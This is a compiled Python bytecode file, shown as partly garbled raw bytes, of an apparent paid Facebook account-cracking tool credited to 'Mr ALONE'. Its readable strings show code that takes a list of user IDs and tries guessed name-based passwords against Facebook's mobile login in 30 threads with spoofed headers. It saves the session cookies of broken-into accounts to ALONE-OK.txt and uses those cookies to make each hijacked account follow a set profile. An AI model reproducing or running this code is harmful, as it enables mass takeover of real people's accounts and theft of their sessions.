o
    ??cb?'  ?                   @   s?  d dl Z zd dlZW n ey   ed? e ?d? Y nw zd dlZW n ey5   ed? e ?d? Y nw zd dlZW n eyN   ed? e ?d? Y nw d dlZd dl Z d dlZd dlZd dl	Z	d dl
Z
d dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlZd dlmZ d d	lmZ d d
lmZ e?? ZejZg d?Zzed k s?edkr?e?  ed ZW n ey?   e?  Y nw e?? Z e j!Z"e jZ#e j$Z%ee Z&dZ'dZ(dZ)dZ*dZ+dZ,dZ-dZ.e'e(e)e*e+e,e-e.gZ/e?0e/?Z1i i Z2Z3d\Z4a5Z6g g g Z7Z8Z9g a:g a5g Z;g Z<d a=dZ>dZ?dZ@ddiZAddddddddd d!d"d#d$?ZBd%ZCd&d'? ZDd(ZEd)d*? ZFd+d,? ZGG d-d.? d.?ZHG d/d0? d0?ZIeG?  dS )1?    Nu!   
 [✓] installing requests !...
zpip install requestsu    
 [✓] installing futures !...
zpip install futuresu   
 [✓] installing bs4 !...
zpip install bs4)?ThreadPoolExecutor)?datetime)?BeautifulSoup)?January?February?March?April?May?June?JulyZAgustus?	September?October?November?December?   ?   z[1;97mz[1;31mz[1;32mz[0m)r   r   r   zhttps://lookup-id.com/?https://free.facebook.comzhttps://www.httpbin.org/ip?
user-agentz?Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]r   r   r   r   r	   r
   r   ZAugustusr   r   r   r   )?01?02Z03Z04Z05Z06Z07Z08Z09Z10Z11Z12Fc                 C   s2   | d D ]}t j?|? t j??  t?d? qd S )N?
g{?G?z??)?sys?stdout?write?flush?time?sleep)?z?e? r   ?Ka.py?jalanD   s
   
?r!   a  _________________Mr ALONE _______________
___________________________________________
  Github : Not Found
Whatsapp : Not Found
YOUTUBE  : Not found
 VERSION : 1.1
    Tool : Paid Tool
___________________________________________
___________________________________________c                 C   sJ   t | ?dks	 t |?dkr#tdtttt t??f ? td? t?  d S d S )Nr   z7

  [1;97m Total OK : [1;97m %s  [1;97mALONEE_OK.txtz'[1;97mPress enter to back ALONEE Menu )?len?print?H?P?str?ok?input?ALONE)ZOK?cpr   r   r    ?hasilT   s   
?r+   c                  C   sv   t ?d? tt? t?t??? } d}| d }t td? td? td? td?}|dv r2t	? ?
t? |dv r9	 d S d S )	N?clear? ?originz [1] Start File Cloningz
 [2] exit z [?] Choose option : ??1r   )?E?ee)?os?systemr#   ?logo?requests?get?url_ip?jsonr(   ?__xxx__?ALONEx?id)ZipmZtodzZIPZ	_ALONE___r   r   r    r)   ]   s   
?r)   c                   @   s4   e Zd Zdd? Zdd? Zdd? Zdd? Zd	d
? ZdS )r:   c                 C   s
   g | _ d S )N)r<   )?selfr   r   r    ?__init__o   s   
z__xxx__.__init__c                 C   sx   t ?d? tt? td?| _t| j??? ?? | _	t ?d? tt? td? d}|dv r1| ?
?  d S td? | ?|? d S )Nr,   zPut File Name : r-   ?y)ZyesZYes?Yr?   z [!] Choose Correct One)r3   r4   r#   r5   r(   Zcnt?open?read?
splitlinesr<   ?__pler__r;   )r=   r<   Z___worldwide___r   r   r    r;   q   s   


z__xxx__.ALONExc                 C   s?  t j?dt? dt| j?? dtt?? dtt?? d?	?f t j??  z?|D ]?}|?	? }t
?? }|ddddd	d
ddddddd?}|jd|? d?|d?}t?dt|j???d?t?dt|j???d?|d|dd?}|ddd| ddddd
dddd| d ddd?}	|jd|? d ?||	d!d"?}
d#|j?? v r?d$?d%d&? |j?? ?? D ??}td't? d(|? d)|? ?? d*||f }t?|? td+d,??d-| ? | ?||?  nq#td7 aW d S    | ?|||? Y d S ).Nz [1;92m[ALONE] ?/z OK=z-CP=? r0   z{NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+z?text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9zmark.via.gpzsame-originZcors?emptyZdocumentzhttps://free.facebook.com/zgzip, deflate brzen-GB,en-US;q=0.9,en;q=0.8)?Host?upgrade-insecure-requestsr   ?acceptZdnt?x-requested-with?sec-fetch-site?sec-fetch-mode?sec-fetch-user?sec-fetch-dest?referer?accept-encoding?accept-languagezhttps://zV/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F)?headerszname="lsd" value="(.*?)"r   zname="jazoest" value="(.*?)"Zlogin_no_pinz8https://developers.facebook.com/tools/debug/accesstoken/)ZlsdZjazoest?uidZflow?pass?nextz	max-age=0z!application/x-www-form-urlencodedz?Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36ZXMLHttpRequest)rH   zcache-controlrI   r.   zcontent-typer   rJ   rK   rL   rM   rN   rO   rP   rQ   rR   z-/login/device-based/validate-password/?shbl=0F)?datarS   Zallow_redirectsZc_user?;c                 S   s   g | ]
\}}|d  | ?qS )?=r   )?.0?key?valuer   r   r    ?
<listcomp>?   s    z&__xxx__.__metode__.<locals>.<listcomp>?z [ALONE-OK] z | z%s|%szALONE-OK.txt?az%s
)r   r   r   ?loopr"   r<   r'   r*   r   ?lowerr6   ZSessionr7   ?re?searchr&   ?text?groupZpost?cookiesZget_dict?join?itemsr#   r$   ?appendrA   ?follow?
__metode__)r=   ?userZ__chi__ZcebokZpw?session?header?rZdasZheader1Zpo?cokiZwrtr   r   r    rk      sr   6
??	
?
z__xxx__.__metode__c                 C   sN   t |jdd|id?jd?}|jddd??d?}|jd	t|? d|id?j d S )
Nz"https://www.facebook.com/okiew.youZcookie)rf   zhtml.parserr_   ZIkuti)?stringZhrefr   )r   r7   rd   ?findr&   )r=   rm   rp   ro   r7   r   r   r    rj   ?   s    z__xxx__.followc           	      C   s?  t d? td?}|dkrt d? | ??  d S |dv r?t?d? t t? t dt| j? ? t d? t d	? td
d??a}| jD ]U}zN|?	d?\}}|?	d?}t|?dksdt|?dksdt|?dksdt|?dkrt||d |d  |d d g}n||d |d  |d d g}|?
| j||d? W q=   Y q=W d   ? n1 s?w   Y  ttt? d S |dv ?r7t?d? t t? td?}t?d? t t? t dt| j? ? t d? t d	? td
d??M}| jD ]A}z:|?	d?\}}|?	d?}t|?dk?s	t|?dk?s	t|?dk?s	t|?dk?r|g}n|g}|?
| j||d? W q?   Y q?W d   ? n	1 ?s+w   Y  ttt? d S t d? | ??  d S )Nz[1] Crack With 2 pass Fast z
 [?] Choose: r-   z
Select Correct Oner/   r,   z[1;37m Total IDs : %s z[1;37m Cracking  EnjoY...z/-----------------------------------------------?   )Zmax_workers?|rF   ?   ?   ?   ?   r   r   Z123zfree.facebook.com)?2r   z 1 : z[1;37m Cracking Started...z
 Select Valid One)r#   r(   rD   r3   r4   r5   r"   r<   ?ALONEkb?splitZsubmitrk   r+   r'   r*   )	r=   ZchiZkbworldZmjrT   ?name?xzZpwxZp1r   r   r    rD   ?   sd   


0 ??




8??z__xxx__.__pler__N)?__name__?
__module__?__qualname__r>   r;   rk   rj   rD   r   r   r   r    r:   n   s    @r:   c                   @   s   e Zd Zdd? ZdS )?loadc                 C   s^   d}t d?}t d?}|d8 }|d7 }tt d??D ]}td? tj??  t?d? qtd? d S )	Nr-   Z30?0r   r0   z Please Wait ....g????????r   )?int?ranger#   r   r   r   r   r   )r=   ?_?__Z___?tr   r   r    r>   ?   s   
zload.__init__N)r~   r   r?   r>   r   r   r   r    r?   ?   s    r?   )Jr3   r6   ?ImportErrorr#   r4   Zconcurrent.futuresZ
concurrentZbs4rb   ?platformr   r9   r   Zrandomr   ?
subprocessZ	threading?	itertools?base64Zuuid?zlibr   rz   r   ZnowZctZmonth?nZbulan?exitZnTemp?
ValueErrorZcurrentZyear?taZbuZdayZha?opr%   ?Mr$   ?K?B?U?O?NZmy_color?choiceZwarnarW   Zdata2Zamanr*   ZsalahZubahPZfuckZpwBarur'   r<   rl   r`   Z
url_lookupZurl_mbr8   Zheader_grupZ	bulan_ttlZdoner!   r5   r+   r)   r:   r?   r   r   r   r    ?<module>   s?   ????
??



	 

